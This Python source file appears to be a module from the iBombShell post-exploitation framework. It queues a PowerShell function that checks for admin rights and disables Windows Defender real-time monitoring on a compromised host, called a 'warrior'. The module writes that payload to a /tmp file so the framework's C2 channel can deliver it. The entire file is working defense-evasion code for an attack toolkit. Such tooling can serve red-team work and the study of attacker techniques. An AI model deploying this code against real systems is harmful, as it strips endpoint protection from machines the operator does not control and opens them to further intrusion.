from termcolor import colored, cprint
from module import Module
from warrior_check import exist_warrior


class CustomModule(Module):
    def __init__(self):
        information = {"Name": "disable-defenderrealtime",
                       "Description": "To disable or enable Windows defender real time",
                       "Author": "@pablogonzalezpe, @josueencinar"
                       }

        # -----------name-----default_value--description--required?
        options = {"warrior": [None, "Warrior in war", True],
                   "enable": ["false", "This option can be true or false", True] }

        # Constructor of the parent class
        super(CustomModule, self).__init__(information, options)

    # This module must be always implemented, it is called by the run option
    def run_module(self):
        if exist_warrior(self.args["warrior"]):
            function = """function defender-realtime ([switch]$enable) {
                
    if ([bool](([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match "S-1-5-32-544")){
        if ($enable.IsPresent) {
            Set-MpPreference -DisableRealtimeMonitoring $false
            check-action -option "False"
        } else {
            Set-MpPreference -DisableRealtimeMonitoring $true
            check-action -option "True" 
        } 
    }else {
        return "You need admin privileges"
    }
}

function check-action {
     param(
            [Parameter(Mandatory)]
            [string] $option
        )
    $outp = Get-MpPreference | fl DisableRealtimeMonitoring | out-string
    if ($outp.Contains($option)) {
        return "Done"
    } else {
        return "It has not been possible to carry out the action"
    }
}
            """
            if self.args["enable"].lower() == "true":
                function += 'defender-realtime  -enable'
            else:
                function += 'defender-realtime'

            with open('/tmp/ibs-{}'.format(self.args["warrior"]), 'a') as f:
                f.write(function)

            cprint ('[+] Done!', 'green')
        else:
            cprint ('[!] Failed... Warrior don´t found', 'red')